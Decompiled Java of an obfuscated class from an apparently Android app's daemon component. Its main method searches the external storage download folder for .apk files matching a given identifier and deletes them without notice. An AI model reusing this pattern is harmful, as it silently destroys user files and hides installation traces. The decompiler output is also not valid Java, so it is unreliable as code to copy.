package com.vvt.q.a;

import android.content.Context;
import android.os.Environment;
import com.vvt.io.d;
import java.io.File;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  
  public static String a()
  {
    return com.vvt.q.a.a.a.a();
  }
  
  public static boolean a(Context paramContext, String paramString)
  {
    bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    try
    {
      String str1 = com.vvt.q.a.b.a.a(paramString);
      bool2 = a;
      if ((!bool2) || (str1 != null))
      {
        int i = str1.length();
        if (i > 0)
        {
          Object localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          Object localObject2 = Environment.getExternalStorageDirectory();
          localObject2 = ((File)localObject2).getPath();
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject2 = File.separator;
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject2 = "download";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject1 = ((StringBuilder)localObject1).toString();
          boolean bool4 = a;
          if (bool4) {}
          localObject1 = d.h((String)localObject1);
          bool4 = a;
          if (bool4) {}
          localObject2 = new java/io/File;
          ((File)localObject2).<init>((String)localObject1);
          int j = ((File)localObject2).exists();
          if (j != 0)
          {
            localObject2 = ((File)localObject2).listFiles();
            int m = localObject2.length;
            j = 0;
            localObject1 = null;
            while (j < m)
            {
              Object localObject3 = localObject2[j];
              String str2 = ((File)localObject3).getName();
              str2 = str2.toLowerCase();
              String str3 = ".apk";
              boolean bool5 = str2.contains(str3);
              if (bool5)
              {
                str2 = ((File)localObject3).getAbsolutePath();
                str2 = com.vvt.q.a.b.a.a(paramContext, str2);
                if (str2 != null)
                {
                  bool5 = str1.equalsIgnoreCase(str2);
                  if (bool5)
                  {
                    bool5 = b;
                    if (bool5) {}
                    ((File)localObject3).delete();
                    bool1 = true;
                  }
                }
              }
              int k;
              j += 1;
            }
          }
        }
      }
      boolean bool3;
      return bool1;
    }
    catch (Exception localException)
    {
      bool3 = d;
      if (bool3) {}
      bool3 = a;
      if (!bool3) {}
    }
  }
  
  public static boolean a(Boolean paramBoolean, String paramString)
  {
    boolean bool1 = false;
    try
    {
      bool1 = com.vvt.q.a.a.a.a(paramBoolean, paramString);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = d;
        if (!bool2) {}
      }
    }
    return bool1;
  }
  
  public static boolean a(boolean paramBoolean, Context paramContext, String paramString)
  {
    boolean bool1 = false;
    try
    {
      bool1 = com.vvt.q.a.a.a.a(paramBoolean, paramContext, paramString);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = d;
        if (!bool2) {}
      }
    }
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/q/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */